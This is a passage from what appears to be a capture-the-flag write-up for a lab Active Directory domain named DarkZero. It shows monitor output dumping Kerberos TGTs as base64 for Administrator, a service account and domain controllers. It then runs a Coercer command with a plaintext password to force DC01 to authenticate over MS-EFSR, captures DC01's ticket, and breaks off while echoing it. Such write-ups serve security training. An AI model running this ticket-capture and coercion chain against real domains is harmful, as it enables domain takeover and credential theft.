UxMDEyMjIxODQ0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 5:05:20 AM
  EndTime               :  10/6/2025 3:05:20 PM
  RenewTill             :  10/13/2025 5:05:20 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  svc_sql@DARKZERO.EXT
  StartTime             :  10/6/2025 1:05:16 AM
  EndTime               :  10/6/2025 11:05:16 AM
  RenewTill             :  10/12/2025 3:20:16 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFgDCCBXygAwIBBaEDAgEWooIEhjCCBIJhggR+MIIEeqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEPjCCBDqgAwIBEqEDAgECooIELASCBCjAtuhoXqsS9Y3hzEBn4lJSM7DBJwyseEo9rMYL5gjpq4BZzdHn++eGtpAZ0HRvBrcTcDmmZiT9qRC4zRvvy+rCw3el00ZVQtAs5Q+hagJA6VYt05BjhENm31M4XpYFyDdKyXSJ1OFUKzuogAJqNmdZTp5Mlfg/cW0xrDuBtfaICDTszisRPrWPnJSWJNwC+rW+64MFwTVHXBjJwLMXEK9YlZvkF9AXWwAuAsjprV99DLjxcicPwV4zGAuuKWhNzRIbYZx441wBhZlS4LCngUlLXnZ9ligoTEo5EXqsSRfPLYHibqHL1DZCKQmfsUyISTu1FdbxiIjDU9T3vb2Gtrkz2knKGudWZXQZHWIUnZEAqXF8X4yMAKpT/a+Hx0QwDJ+GNqxzRgJ10jVx+h2A8UHKiBdsbirpqQUt9ovHzYizSO59ekSGqoX34u0h8Ey58a6fs4fjlHA9eAOuKEwApANzyU9vgGTPJzHVDPJTK9FxMIWl/4Lof+x4l/s+n37AI6u1EmvDduHarbieJFWfMPpoaCtxTuMYdNhJNL+eYFz7a74q0CR9hkGfntIBLUvJ2tFSjaSq1KvSeohsJI1EcgFRdp0XCyCvnO57EcVQYEzzvNI4GGiNJIZ87CXiHOIOxo/+bH/Drnu3b5Z6y+uSIAeV8ezd7X+2elncSsewmrs2qSEh9VnPF6oTPNs9wmPfR5UZEuMnImv3btP6InuJzSa1bABNMcNAg+Oa8plmKa2HD+qmLeYmfvSVdhSQkpapGfzix04DtqYhBBmpYSJpZ7jS96aK3hBJ5xI2S35Ewb8hT53uaObvWJLp55ZG8jxztAdC0rQ9P7dYto+zCTaW8T/3hZ4CQoo582hHhvieDv4JWRUMh98NTDRuP7g/JHDIg4lTtPhDUJ/vKuoaf024nChQu0F/yyLyFKik55z6InI9v3msamaEC1v161glqsp7HYHl8U2kgPDs0JlW4yy10CoTksxBpanW98+WV2o2RQ/B7IcaWiPL4AAk+ftREvmK620vmw66VA3kgCVtxldHRGwAI3xyHcQth81IcWApqeGs8211I2Lv4jtgICMaI2pJu6ptQdHXgC0+VVHJBtRlZAb6EeNLGG/eZsUcAkp3NUWC99csRy48qat/96JtIA/inmFdLUWIoSOHI+txv6CQ33kTrHlU9YBfK3PzVahJnX7522ZCIgjpc5XNlI5/JybXorr5jRBcmdweftiaNPkOyIntgbo59yFu2gFhH3xHrJHjB0+CzW2MRWRKJftDTEScLrVWqxzgdHUgpLpAa2BSTLqNqd7MFrYA1zm9AHvEBXthMmTGOXex8wiBq7s0YOUnVfmIogvzr7t1H0NjDfrLQyUhB7tYT4vjrimbYdHfyG3ysTReG0GbfXURjc4bNEJfAmanvy+R1hK+w6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIGzgGQkAaGj8MJ9dKMzQ9LJNfHLTOYK1aKGxJWaVvHlBoQ4bDERBUktaRVJPLkVYVKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAEDhAAClERgPMjAyNTEwMDYwODA1MTZaphEYDzIwMjUxMDA2MTgwNTE2WqcRGA8yMDI1MTAxMjIyMjAxNlqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 2:03:12 AM
  EndTime               :  10/6/2025 12:03:12 PM
  RenewTill             :  10/12/2025 4:18:13 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD7wNf12x4eKuLTmJowGnhAEK4vgGFVZZvusGTYQc2AcK1kMYKMUJpa84+mfzKwlCU6yy6Hw7xOjtMnOPK+dqxUmjDUTTyXoXALvXAmTAfYaPNJzXMQJdTo9ON11VORLbBQRSkas/VL1Ulc97suuF5DD7EIB06hptgYmWNbS6HxDopxCGJyVtW9PRoBsx6Zva4xcqMzTzWKni0wD9ujAi/c8BQy0fBsP2gSRv5vnNKu24Ne4t8wM6D+kJ9plHk3yQj6OMZFBdQmE7t2qUkE8h7q6HK+nNgNf0af13J7zT6ul6lGJj0rlwz+WMce28hXGwkrwWNbtv77LLu+7dnXinlOrul8ExOaUCicKZmSwsEGf1viY7k0dz5dcqReMhGjmUMRciuiN7ASK7LaUR0XR2cAHJuLxUo54vO1Q47SrmorJ/pHg7Ko+P8CvJS4JYB7qh4+rjL2ugeNYW291MUQjo6xN/4qCHDeYcBAivq9561a7YPaoJNY6biYZdiMwyp+sHGKIjV8x95Vu48w6hiT7FPzsJX+IXtbl5WBKpWZiYdF7tgFgl4aRT9vDYs4RF22v6WSmBkhMyxW47lBXV5WoLkmDu9DuWlSq7N/fr0AXqW1TLsZepbQOjMLPe8FvDqe5fEIJpSYLrtxoZtnEgwO0nUro3dYMEsz4hcD7jOlS47+WUx7Xq3jDIBq7REiuuaiVQGtsoEYlo96EYNi9DgQaVRPGo78MHLzqdXHCTrCIAhkUV/1dwUwZEvkleXVqqdxZ9IENC1tMvAYAPPMuEmjNNS9j9p5AuulhV9I6AJVqkuZ4X5nXprVx/Ez3QO9J0VjCBBE8xaJscFq3R6F7SLmANXqIAIIHSLH+vIpdrWi1iVXW5GMKJYCM3d+t5CsfVexXOgDsAcGVp83ip9a93NcLveYOeqnNkvbkqRcS9aPEmOmcqRYX396YO4ka69smBO7tt+nBHnXzafTwYBMZhpUeVRo9d0DO8N4yDGGLoUXwh8b3q0oEli3HdvS2RgaK1mUyEeO8uJNKen30iL6VZez0YhrK+ye7MAcWMMafUAQgdUmDTkitg39PYoQ7PxE5KHx9pV76eRN08mUx/2WUiSR0qN8Z9TcidkoJHdcBR/Wpwmwd4ISLn/wOmjWkuZ9T8ReiIGbYsdSW7wYEAIwDSNbLFjFhiuYmFYg7hIJAvieWCE7tIc3LlKrWm5xFEi0951N6DjnUZmVFaODw0nqNH9e2n2QXa2KJLB7tghihwwPpyeU+AzSqWBBf3cI5fHsIclE5NxATGJjHJ4JiBs3G8zcWAnoPegjgpAiFsYne67CiEeR7o3ku5VpRm1J4oPC54uOtdALUmUgzpC6iU/yuA+VXIoGQcaeOs59CyYVprcCTOLQYCkMJ2KlH0+cwlwqP2kekDG/PtPHlJGJRy/t7eBT8AM7ae1+s9XcO5RI0eggFgROjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCDtOV+juBLTAs4fexC/SH0z88ErDyjhokoUXWH7OkBQNKEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDI1MTAwNjA5MDMxMlqmERgPMjAyNTEwMDYxOTAzMTJapxEYDzIwMjUxMDEyMjMxODEzWqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 1:12:12 AM
  EndTime               :  10/6/2025 11:12:12 AM
  RenewTill             :  10/12/2025 3:27:13 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 10/6/2025 12:17:37 PM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  10/6/2025 12:49:27 AM
  EndTime               :  10/6/2025 10:49:27 AM
  RenewTill             :  10/12/2025 3:18:44 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5rZELyRfh8UlEKtcUAFQ3OqLzkA4MtckKNxxyxjnSlRpQECD7Br4H7ti7LXkx7SNIrdVQxGubfLZs3hiKCd/IYZNGLSVUvxQVYCYZqXYmccpoSQ1bEMXIzjyD+JTmkAu1Zo99BoluspN7hgrpvRCNp0afBRIwvbhnaFRo7TR+UC6VjJUEfNHMotVcsAFGZKTzDp9PYAY9a5MHwrbeI8gqvOqVKOEj1a9fZgJArdI2cozxWLYn+8mYgtKDsRwjbSOvfFT/yYbYiAC1EiLolWx4bxxknhJx5LLwo8dWR2vEGTrMzvwPAgtmYXYJe7cbmMnE1fE55hxQkvRA0s0fJJoVxomKr8Wkku0e1E4I6wtx/lATK5Xgli5Zxp8S4fvNVQ7o1iH+0L4lx4BbhkvNuC3vLh7tAFVwwVOWxaIsJLlaOs3m9aO/62OAVMk/whRLX/RDyX1QucenyFvbJGK9uL4K8StM7gm6nRNfDUQtyRH9CszGjc0WtnAJYLHgE+rER9DkKZe3kLA+mfkjR0KWsuiCsCMu0+Eo70rzKped0y/ujnHeeoR/3kIYHbdimhgmdrQi6EuC2205Bfdy8Rx27ZuSWyQHJ9Vkl3fRsPWU1KTr3a7hnzc9gRQH7PGQscS1b0GN23EcY+6kJLRTXGkAaLdiO19k7MAXca7xLY5yy9kvBPGFqbmfs6vzQ6BsrOF4JMWGnEWkuP2h1M2JylRQ3TtfKHYCVjWd+ibFASuDVr13rDhDOPtmFi/Lp9aBCu4QqC1EzcC0qaDtWdeHxxgk/ikQnHaEJ9MO6OT2Vj7rVVR020+TaqTqFelqrUPTwOq2zUNTX0wc8Za+CI92IaXWtXDZOjWAzavX9e9PCx2ZqJdmFx5xT3fAH3tz2awfNz1FfbMpeD72fc7wML1dyAH+xFMshj7GMQCTIg7DIOZ8J5Y/jlRd207ulcHSdIjxjyVwGpRqPScS5DX7xYrT7ePwilxRd/mkRHJQCMJvtsKqTyJjQCv7ihIbhEJP5+n90f8OqeAaX1keIJSC4sistb1dxYpAcmGBslbqccFv3zzuJ9wcelNhVE2gN3nh/eRqRiVBnZj0QCY5C0OI8plwsPFzTnvpHQZ0pjmFFdsjqbvkt7mLtZv5UHMv969M6W+8+arn1b5BNwf8kp5u6reoWbxrEpBe8xcbC82z7KN7HgnT0xzDM4oLPimUYV61cCbFcX9rXq82WReywgWlMrrTjWrCO7hFOVeN/LOnCXhz2kX9zrHWLkslataKEc1FzPwpcXFFz5lx9XDEvSpHqjI+RE1APVd07Xci34RjUkg6a5+KP8EqGiq5Y7DdlFXVhoJdHFUFV/spie0X+Ddbhi6dzvuNR0CeFqL+lKPqcYrypVLk4v4wkUDveUqJIUdGUaWXvT13P8bsWKAHH4LK0JEn9amHQKUrLg/gHxzZXClcXYngrtfWjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCLEugSKGsT66M1lJMJhutZNA8gVif4zF5kKofHEECB2qEOGwxEQVJLWkVSTy5FWFSiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDI1MTAwNjA3NDkyN1qmERgPMjAyNTEwMDYxNzQ5MjdapxEYDzIwMjUxMDEyMjIxODQ0WqgOGwxEQVJLWkVSTy5FWFSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDERBUktaRVJPLkVYVA==

[*] Ticket cache size: 6
```

After running, we can see we got TGT just from `DC02` so now we will trigger authentication from `DC01`. <br>
&rarr; There is alot of way to do this, for our case, we have [Coercer](https://github.com/p0dalirius/Coercer) already on our machine we gonna use this one.

> *We can use `Printer Bug (MS-RPRN)` or `PetitPotam` to trigger authentication also.*

```bash
└─$ coercer coerce -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -l DC02.darkzero.ext -t 10.129.121.112
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 10.129.121.112
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49669,49670,49895,49926,64080,49875,49975
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\DC02.darkzero.ext\m8BiSEJs\file.txt\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? C
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\DC02.darkzero.ext\3cqBeKdn\\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? S
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\DC02.darkzero.ext\bzxIPYzh\file.txt\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? S
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\DC02.darkzero.ext\5rMSr2Lw\file.txt\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? S
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\DC02.darkzero.ext\ut7pC8hU\file.txt\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? C
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDuplicateEncryptionInfoFile(SrcFileName='\\DC02.darkzero.ext\w1w62Ncy\\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? X
[+] All done! Bye Bye!
```

Back to the monitor.

```bash
[*] 10/6/2025 12:19:07 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 12:48:47 AM
  EndTime               :  10/6/2025 10:48:47 AM
  RenewTill             :  10/12/2025 3:18:22 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaxQn71vjOoX7N5NALAx+JmiqmD66LHXl6mE61CmqvJ/7opoqvcME99U8SmvtCQoPfCpjVSokqsue8x3oVcHd/UUFWKN2teZlZ43GUgT2wspbhXnppO1lTyYuXGjawUbTtmOZbHxqrieYTwLF4j4I2808ZOj+9FZEYv/ALxKcv4u7NYrfv2kKjDs1cs3ujZvyY5pUm7bLxWc3K1PDLUdWdMpkhc+Pw0wIDbLwl6n0ztEkfnD44keGpB7QSIWq8Mc28Ilhp5liJp5RIam/sa2d5IExq1Pxchnng3h0isrF6WGt1+oJj+g+Ng/tMEDl8Vc7JE4qaESnkWp7zfg9Gd3bAy8Xfd4KGOyeWgXxXcsOtGqUYKduPmjP3uaNVgclW3F4hQtzDZgt6PlvADPVfnL1K/EdEDZQo37RBTNUzGzF/pHchS+hSOWwpiXZ7EVVl8xOfP22gMXOsula69x2pcpR0MCtvquIT7qrVAKAmHwfRU4HGa0Qz/ASxZI8mJEipZ0eHSnTYzuV1SBiaQh9QBefvZXRNf13GRTAoHNxK4i8b0mU309EZ8Fhz+5rEhAytMr8b6hdTU16GkvYKr/UpSzVp6Zp6PKiEbinVZBuvtSHjIQT8lzJXyofJlaTFwvMnsEdLHjD0XI7+/qkhsUajVgvyOTHG8/gIj03zugV1JxC8x5Ww0wFTzkQs8LSErg+XQ5k9UjKgA3VGQCppy/EexbYfu4QFFMqxffw6BK+7wMN8YtGARye93IPS4/vqxsmxioVnOFRm1TidKi+nSh/z04WmtbOByuLs86eWKSi2KzSoMiDrsBkfkCPrXV0qddmi17q9JZoLXhN1GGonsz7TbszxaRYc0FSy8Ba3aUEyekCRkDXw3lZlqt2fKgbNs+qlgiiOf3xZcBduBA5/GQ2y8cVMmF9BmOlmz4AaLASikEP5l4GYsuRkCcnYbGN1tV87cQR2+Nl4OGis5T9BdScUcvc+sy3sroFdVAmxfLjFClo0Rv45/dcJzcskN0SmZeEcnHx3ezNK6PwCo6yRKcdKNYXcJr6Ja2w47c0Z2piSNkDcG3649DTIVT/3T3cVh5MenxB2hkymck7CzT4XhmC/+0Zg7Rfzki3WlKkl7g2hgH35Z+A9ZsgVtxIubD2QnaZlyOyLMUWhxVUVlWruc87yWUJyHsWyb6VXQZRbRzijXiSumzXen8oOkgltN0KCHXfEw8zZ85yrwrcHuNZG09uI3tfWG8J5SvptCXbcpPEG+WP+HXRZFHeHc7vq3nNuDPKxGiqhbOcIEEbWe2wc+PQ5pWssGu1vW1GNFJeg9Y4Y/Ffjmjw/vN2mRf0Fdg6G6aP9oVDwq1PC9/oDhzfeXsXy1qrScevE7aueOn9YE2BxCv9BaU4mUysUBLu3o/rPF7tLbGXqEO+F+EuZdVgRyVsOoozh2CW8GxQSgo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgkcYPHQ9dmapvND6uyfpdPdRVDd/ogbrfcx9lePb4mo+hDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDYwNzQ4NDdaphEYDzIwMjUxMDA2MTc0ODQ3WqcRGA8yMDI1MTAxMjIyMTgyMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 7
```

There we go, capture out ticket for `DC01`.

```bash
└─$ echo "doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaxQn71vjOoX7N5NALAx+JmiqmD66LHXl6mE61CmqvJ/7opoqvcME99U8SmvtCQoPfCpjVSokqsue8x3oVcHd/UUFWKN2teZlZ43GUgT2wspbhXnppO1lTyYuXGjawUbTtmOZbHxqrieYTwLF4j4I2808ZOj+9FZEYv/ALxKcv4u7NYrfv2kKjDs1cs3ujZvyY5pUm7bLxWc3K1PDLUdWdMpkhc+Pw0wIDbLwl6n0ztEkfnD44keGpB7QSIWq8Mc28Ilhp5liJp5RIam/sa2d5IExq1Pxchnng3h0isrF6WGt1+oJj+g+Ng/tMEDl8Vc7JE4qaESnkWp7zfg9Gd3bAy8Xfd4KGOyeWgXxXcsOtGqUYKduPmjP3uaNVgclW3F4hQtzDZgt6PlvADPVfnL1K/EdEDZQo37RBTNUzGzF/pHchS+hSOWwpiXZ7EVVl8xOfP22gMXOsula69x2pcpR0MCtvquIT7qrVAKAmHwfRU4HGa0Qz/ASxZI8mJEipZ0eHSnTYzuV1SBiaQh9QBefvZXRNf13GRTAoHNxK4i8b0mU309EZ8Fhz+5rEhAytMr8b6hdTU16GkvYKr/UpSzVp6Zp6PKiEbinVZBuvtSHjIQT8lzJXyofJlaTFwvMnsEdLHjD0XI7+/qkhsUajVgvyOTHG8/gIj03zugV1JxC8x5Ww0wFTzkQs8LSErg+XQ5k9UjKgA3VGQCppy/EexbYfu4QFFMqxffw6BK+7wMN8YtGARye93IPS4/vqxsmxioVnOFRm1TidKi+nSh/z04WmtbOByuLs86eWKSi2KzSoMiDrsBkfkCPrXV0qddmi17q9JZoLXhN1GGonsz7TbszxaRYc0FSy8Ba3aUEyekCRkDXw3lZlqt2fKgbNs+qlgiiOf3xZcBduBA5/GQ2y8cVMmF9BmOlmz4AaLASikEP5l4GYsuRkCcnYbGN1tV87cQR2+Nl4OGis5T9BdScUcvc+sy3sroFdVAmxfLjFClo0Rv45/dcJzcskN0SmZeEcnHx3ezNK6PwCo6yRKcdKNYXcJr6Ja2w47c0Z2piSNkDcG3649DTIVT/3T3cVh5MenxB2hkymck7CzT4XhmC/+0Zg7Rfzki3WlKkl7g2hgH35Z+A9ZsgVtxIubD2QnaZlyOyLMUWhxVUVlWruc87yWUJyHsWyb6VXQZRbRzijXiSumzXen8oOkgltN0KCHXfEw8zZ85yrwrcHuNZG09uI3tfWG8J5SvptCXbcpPEG+WP+HXRZFHeHc7vq3nNuDPKxGiqhbOcIEEbWe2wc+PQ5pWssGu1vW1GNFJeg9Y4Y/Ffjmjw/vN2mRf0Fdg6G6aP9oVDwq1PC9/oDhzfeXsXy1qrScevE7aueOn9YE2BxCv9BaU4mUysUBLu3o/rPF7tLbGXqEO+F+EuZdVgRyVsOoozh2CW8GxQSgo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKz